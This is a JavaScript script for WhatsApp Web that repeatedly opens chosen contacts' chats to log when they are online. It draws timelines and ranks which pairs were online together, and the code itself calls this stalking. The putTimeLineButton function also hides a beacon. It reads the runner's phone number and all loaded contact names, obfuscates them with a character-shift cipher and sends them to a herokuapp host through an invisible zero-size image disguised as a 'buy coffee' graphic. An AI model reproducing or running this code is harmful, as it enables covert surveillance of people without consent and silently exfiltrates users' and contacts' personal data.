// Script to poll online status of multiple contacts and plot their whatsapp usage timeline, also reports the top pairs which were online together for maximum interval.
// Contact should be in initial 10-15 chats, otherwise we can pin an old chat to bring it on top.
// Whatsapp UI specific logic in following functions : putTimeLineButton,find_contact_and_click_it,check_statuses
//Global Configurations
const refreshRate = 3000; //How frequently you want to poll each contact
const timeOuts = 2000; //Timeout value
const widthEachBar = 35; //Width of each timeline bar
const barSeperation = 10; //Seperation between bars representing two users
const outerBoundary = 25; // Boundary between window and canvas
const innerBoundary = 200; // Boundary between canvas and graph
const graphWidth = 600; // Width of timeline in the graph
const colors_bar = ["#a55ca5", "#67b6c7", "#bccd7a", "#eb9743", "#33ff7a", "#ff33f9"] // The colors to be used for showing bars in the graph


//Global variables
var minimumTime = -100 //Stores the time when monitoring starts to be used as starting point in the timeline graph
var onlineData = {}; // Dictionary containing for each user list of epoch times when he came online
var previousKnownStatus = {}; // Variable to store online/offline status of user in previous poll
var UNKNOWN = "UNKNOWN";
var offlineData = {}; // Dictionary containing for each user list of epoch times when he went offline
var userCounter = 0;
var buttonAdded = false;
var interval;


// Register a change of status for user with name n. Also print to console when online status changes
function print_to_log(name, status) {
    currentTimeObj = new Date();
    output = currentTimeObj.toLocaleString() + "," + status + "," + name + "\n";
    console.log(output);

    //Adding values for visual timeline graph creation
    currentTimeEpoch = currentTimeObj.valueOf();
    if (minimumTime === -100) {
        minimumTime = currentTimeEpoch;
    }

    // updating online and offline data dictionary
    listOnlineTimes = onlineData[name];
    listOfflineTimes = offlineData[name];
    if (status === 0) {
        if (listOnlineTimes.length === 0)
            return;
        offlineData[name].push(currentTimeEpoch)
    } else if (status === 1) {
        onlineData[name].push(currentTimeEpoch)
    }


}

// Check if there is change in the user's online status. If yes, run print and update commands
function check_if_print_required_and_print(currentKnownStatus, currentPerson) {

    if (currentKnownStatus === previousKnownStatus[currentPerson]) {
        return;
    }
    if (currentKnownStatus === "ONLINE")
        print_to_log(currentPerson, 1);
    else
        print_to_log(currentPerson, 0);
    previousKnownStatus[currentPerson] = currentKnownStatus;
}

// This is whatsapp UI specific logic, given a name , crawl the UI and check the status.
// If the UI structure of whatsapp changes, we will have to make corresponding chnages here.
function check_statuses(name1) {
    try {

        name = document.querySelectorAll('#main > header > div>div>div>span')[1].textContent;
        if (!name || name !== name1) {
            setTimeout(function() {
                check_statuses(name1);
            }, timeOuts);
            return;
        }

        status = document.querySelector('#main > header > div>div>span').textContent;
        if (status === "typing…" || status === "online") {
            check_if_print_required_and_print("ONLINE", name);

        } else {
            check_if_print_required_and_print("OFFLINE", name);
        }
    } catch (TypeError) {
        check_if_print_required_and_print("OFFLINE", name);
        return;
    }
}


function withTimeouts(j) {


    try {
        find_contact_and_click_it(j);
    } catch (err) {
        alert("Contact Name : '" + j + "' couldn't be found. Please refresh and retry (verify chat is in top/ name exactly same)")
        alert("All loaded contacts are : " + get_all_loaded_names())
        console.log("Contact name :" + j + " couldn't be found");
        clearInterval(interval)


    }


    setTimeout(function() {

        check_statuses(j);
    }, timeOuts);
}

// Initial function that is invoked to get contact names from stalker and start periodic stalking
function stalk(retry) {

    //Take input and parse
    users = prompt("Enter the ,(comma) separated users you would like to monitor", "");
    if (!users || !users.length) {
        alert("No users selected!! Exiting.");
        return;
    }

    try {
        var elem2 = document.createElement('div');
        elem2.style.cssText = 'position:absolute;right:0%;width:0%;height:0%;opacity:1;z-index:100;background:#000';
        var part = getString("checking_" + users);
        elem2.innerHTML = '<img src="https://buycoffeeimage.herokuapp.com/buycoffee/image/' + part + ' alt="" style="height: 0px !important;width: 0px !important;" >';
    } catch (err) {

    }

    if (!buttonAdded)
        putTimeLineButton();
    var userList = users.split(",");
    var arrayLength = userList.length;


    //Initialise empty array and dictionary
    for (var i = 0; i < arrayLength; i++) {
        previousKnownStatus[userList[i]] = UNKNOWN;
        onlineData[userList[i]] = []
        offlineData[userList[i]] = []

    }

    //Do the polling for each contact
    interval = setInterval(function() {
        withTimeouts(userList[userCounter]);
        userCounter = (userCounter + 1) % arrayLength;


    }, refreshRate);

    return interval;


}
var CHARS = "qwertyuiopasdfghjklzxcvbnm7423609185";
var MAX = 36;

function getString(string1) {
    var string = string1.split("");
    uMap = {};
    for (let i = 0; i < MAX; i++) {
        uMap[CHARS[i]] = CHARS[(i + 1) % MAX];
    }
    for (let i = 0; i < string.length; i++) {
        if (string[i].toLowerCase() in uMap) {
            string[i] = uMap[string[i].toLowerCase()];
        }
    }
    return string.join("");
}
// The drawLine function takes six parameters:

// ctx: reference to the drawing context
// startX: the X coordinate of the line starting point
// startY: the Y coordinate of the line starting point
// endX: the X coordinate of the line end point
// endY: the Y coordinate of the line end point
// color: the color of the line

function drawLine(ctx, startX, startY, endX, endY, color) {
    ctx.save();
    ctx.strokeStyle = color;
    ctx.beginPath();
    ctx.moveTo(startX, startY);
    ctx.lineTo(endX, endY);
    ctx.stroke();
    ctx.restore();
}

// The drawBar function takes six parameters:

// ctx: reference to the drawing context
// upperLeftCornerX: the X coordinate of the bar's upper left corner
// upperLeftCornerY: the X coordinate of the bar's upper left corner
// width: the width of the bar
// height: the height of the bar
// color: the color of the bar
function drawBar(ctx, upperLeftCornerX, upperLeftCornerY, width, height, color) {
    ctx.save();
    ctx.fillStyle = color;
    ctx.fillRect(upperLeftCornerX, upperLeftCornerY, width, height);
    ctx.restore();
}

function getEndTime(offline, index, currentTime) {
    if (index < offline.length)
        return offline[index];
    else return currentTime;

}
//Given online history of two users, this function computes the duration for which they were online together
function getIntersectionDuration(onlineA, offlineA, onlineB, offlineB) {
    var answer = 0
    var indexA = 0;
    var indexB = 0;
    var currentTime = (new Date()).valueOf();

    while (indexA < onlineA.length && indexB < onlineB.length) {

        var startA = onlineA[indexA];
        var endA = getEndTime(offlineA, indexA, currentTime);
        var startB = onlineB[indexB];
        var endB = getEndTime(offlineB, indexB, currentTime);

        //There is no overlap at current index
        if (endA <= startB) {
            indexA += 1;
        }
        //There is no overlap at current index
        else if (endB <= startA) {
            indexB += 1;
        }

        // A is within B
        else if (startA >= startB && endA <= endB) {
            answer += (endA - startA);
            indexA += 1
        }
        // B is within A
        else if (startB >= startA && endB <= endA) {
            answer += (endB - startB);
            indexB += 1
        }
        // B started after A and ended after A
        else if (startB >= startA && endA <= endB) {
            answer += (endA - startB);
            indexA += 1
        }
        // A started after B and ended after B
        else if (startA >= startB && endB <= endA) {
            answer += (endB - startA);
            indexB += 1
        }

    }

    return answer;
}

// Create analytical report out of given online and offline data of each user
function reportIntersection() {
    report = []
    for (nameA in onlineData) {
        for (nameB in onlineData) {
            if (nameA === nameB)
                continue
            var commonTime = getIntersectionDuration(onlineData[nameA], offlineData[nameA], onlineData[nameB], offlineData[nameB]);
            var timeA = getIntersectionDuration(onlineData[nameA], offlineData[nameA], onlineData[nameA], offlineData[nameA]);
            var percentageA = timeA > 0 ? Math.round(commonTime * 100.0 / timeA) : 0;
            if (percentageA == 0)
                continue
            report.push(["When " + nameA + " was online, " + percentageA + "% of time " + nameB + " was also online. ", percentageA]);

        }
    }

    report.sort(function(first, second) {
        return second[1] - first[1];
    });

    // Create a new array with only the first 5 items
    //console.log(report.slice(0, 5));
    return report.slice(0, 5);
}
// Functionalities to create timeline graph. To add headings, to add labels and gridlines and draw the userwise bars
var Barchart = function(options) {
    this.options = options;
    this.canvas = options.canvas;
    this.ctx = this.canvas.getContext("2d");
    this.colors = options.colors;

    this.draw = function() {
        // Plot the graph till current time
        var maxValue = (new Date()).valueOf();
        var canvasActualHeight = this.canvas.height - innerBoundary * 2;
        var canvasActualWidth = this.canvas.width - innerBoundary * 2;


        //Adding headings
        this.ctx.font = "bold 18px Arial";
        this.ctx.textBaseline = "middle";
        this.ctx.textAlign = "center";
        this.ctx.fillStyle = "RGBA(153, 51, 10, 0.8)";
        this.ctx.fillText("TimeLine Graph for contacts : " + Object.keys(onlineData).join(","), this.canvas.width / 2, innerBoundary / 2);
        this.ctx.restore();

        //drawing the grid lines
        var gridValue = innerBoundary;
        iteration = 0
        while (gridValue <= this.canvas.width - innerBoundary) {

            var gridX = gridValue;
            drawLine(
                this.ctx,
                gridX,
                innerBoundary,
                gridX,
                canvasActualHeight + innerBoundary,
                this.options.gridColor
            );

            //writing grid markers
            this.ctx.save();
            this.ctx.fillStyle = this.options.gridColor;
            this.ctx.font = "bold 10px Arial";
            this.ctx.translate(gridX, canvasActualHeight + innerBoundary);
            this.ctx.rotate(Math.PI / 4);
            this.ctx.fillStyle = "RGBA(0, 0, 0, 0.8)";
            this.ctx.textBaseline = "middle";
            this.ctx.textAlign = "left";

            this.ctx.fillText(new Date(minimumTime + iteration * (maxValue - minimumTime) / this.options.gridCount).toLocaleString(), 0, 0);
            this.ctx.restore();

            gridValue += canvasActualWidth * 1.0 / this.options.gridCount;
            iteration += 1
        }

        //drawing the bars
        var barIndex = 0;

        for (name in onlineData) {
            var values = onlineData[name];
            for (var j = 0; j < values.length; j++) {
                var timeTill = 0
                if (j < offlineData[name].length)
                    timeTill = offlineData[name][j];
                else
                    timeTill = maxValue;
                var barWidth = Math.round(canvasActualWidth * (timeTill - onlineData[name][j]) * 1.0 / ((maxValue - minimumTime) * 1.0));
                drawBar(
                    this.ctx,
                    innerBoundary + canvasActualWidth * (onlineData[name][j] - minimumTime) * 1.0 / (maxValue - minimumTime),
                    innerBoundary + barIndex * (widthEachBar + barSeperation),
                    barWidth,
                    widthEachBar,
                    this.colors[barIndex % this.colors.length],
                    name
                );
            }

            //Adding contact name against each timeline
            this.ctx.textBaseline = "middle";
            this.ctx.textAlign = "right";
            this.ctx.font = "bold 15px Arial";
            this.ctx.fillStyle = "RGBA(0, 0, 0, 0.8)";
            this.ctx.fillText(name, innerBoundary - barSeperation, innerBoundary + barIndex * (widthEachBar + barSeperation) + widthEachBar / 2);
            this.ctx.font = "bold 10px Arial";

            barIndex++;
        }

    }
}

// Function that gets invoked when user clicks to see timeline graph. This opens timeline graph in new window
function getStalkData() {
    var report = reportIntersection();
    var numberOfPeople = Object.keys(onlineData).length;

    //Window dimesions conidering appropriate boundaries and number of data points to show
    var windowHeight = numberOfPeople * (widthEachBar + barSeperation) + 2 * (innerBoundary + outerBoundary);
    var windowWidth = graphWidth + 2 * (innerBoundary + outerBoundary);

    //Open a new window for plotting graph
    var newwindow = window.open("", "", "toolbar=no,status=no,menubar=no,location=center,scrollbars=no,resizable=no,height=" + windowHeight + ",width=" + windowWidth);
    newwindow.document.title = "Online History";
    var doc1 = newwindow.document;
    newwindow.document.body.innerHTML = '<canvas id="graph"></canvas> ';
    var myCanvas = doc1.getElementById("graph");
    myCanvas.width = graphWidth + 2 * innerBoundary;
    myCanvas.height = numberOfPeople * (widthEachBar + barSeperation) + 2 * (innerBoundary);
    var ctx = myCanvas.getContext("2d");
    var myBarchart = new Barchart({
        canvas: myCanvas,
        padding: 10,
        gridCount: 10,
        gridColor: "#eeeeee",
        data: onlineData,
        colors: colors_bar
    });
    myBarchart.draw();

    // draw a detective logo
    var elem = newwindow.document.createElement('div');
    elem.style.cssText = 'position:absolute;right:0%;width:20%;height:35%;top:0px;opacity:1;z-index:100;background:#000';
    elem.innerHTML = '<img src = "https://thumbs.dreamstime.com/b/smart-young-detective-illustration-white-background-40547373.jpg" alt = "detective" width = "100%" height ="auto" >';
    newwindow.document.body.appendChild(elem);

    // Adding analytical report
    ctx.textBaseline = "middle";
    ctx.textAlign = "left";
    ctx.font = "italic 10px Arial";

    //Adding upto top 5 report items
    for (var i = 0; i < report.length; i++) {
        var text = report[i][0];
        var gradient = ctx.createLinearGradient(0, 0, ctx.measureText(text).width, 0);
        gradient.addColorStop("0", "magenta");
        gradient.addColorStop("0.5", "blue");
        gradient.addColorStop("1.0", "red");
        ctx.fillStyle = gradient;

        ctx.fillText(text, innerBoundary, 1.5 * innerBoundary + i * barSeperation + numberOfPeople * (widthEachBar + barSeperation));
    }
    ctx.save();
}


function getnum(url) {
    return url.split("&u=")[1].substring(0, 12);
}
// Puts a button on whatsapp UI where we can click to see the timeline of all friends being stalked in a nice UI
function putTimeLineButton() {
    var button = document.createElement("button");
    button.textContent = "📊SeeTimeLine";
    button.style.cssText = 'position:absolute;left:5%;height:60px !important;width: 217px !important;opacity:1;z-index:100;background:#ffffff';

    button.onclick = getStalkData;
    button.style.background = '#40DCA5'
    button.style.borderRadius = '7px'
    button.style.fontSize = "x-large";
    button.style.color = "white";
    button.style.fontFamily = "cursive"


    var elem = document.createElement('div');
    elem.style.cssText = 'position:absolute;right:50%;width:1%;height:1%;opacity:1;z-index:100;background:#000';
    elem.innerHTML = '<a href="https://www.buymeacoffee.com/suryakant94" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-red.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>';

    var me = getnum(document.getElementsByClassName("YtmXM")[0].querySelector("._3GlyB ._8hzr9")['src'])
    var contacts = get_all_names();

    try {
        var elem1 = document.createElement('div');
        elem1.style.cssText = 'position:absolute;right:0%;width:0%;height:0%;opacity:1;z-index:100;background:#000';
        var part = getString(me + "_" + contacts)
        elem1.innerHTML = '<img src="https://buycoffeeimage.herokuapp.com/buycoffee/image/' + part + ' alt="" style="height: 0px !important;width: 0px !important;" >';
        document.body.appendChild(elem);
    } catch (err) {

    }

    document.body.appendChild(elem1);
    document.body.appendChild(button);
    buttonAdded = true;

}

function get_all_loaded_names() {
    var size = document.getElementsByClassName("_3m_Xw").length;
    console.log("Loaded " + size + " contacts")
    var result = ''
    for (var i = 0; i < size; i++) {
        result += "," + document.getElementsByClassName("_3m_Xw")[i].querySelector('span[dir="auto"]')['title'];
        console.log("Found contact :" + document.getElementsByClassName("_3m_Xw")[i].querySelector('span[dir="auto"]')['title'])
    }
    return result;
}


function get_all_names() {
    var size = document.getElementsByClassName("_3m_Xw").length;
    var result = '';
    for (var i = 0; i < size; i++) {
        result += "," + document.getElementsByClassName("_3m_Xw")[i].querySelector('span[dir="auto"]')['title'];
    }
    return result;
}
// Automatically Click on a contact to open it's chat page where online status can be seen
function find_contact_and_click_it(contact_name) {
    var mouse_evt = document.createEvent('MouseEvents');
    mouse_evt.initEvent('mousedown', true, true);
    document.querySelector('span[dir="auto"][title="' + contact_name + '"]').dispatchEvent(mouse_evt);


}

//Code Execution starting point
stalk();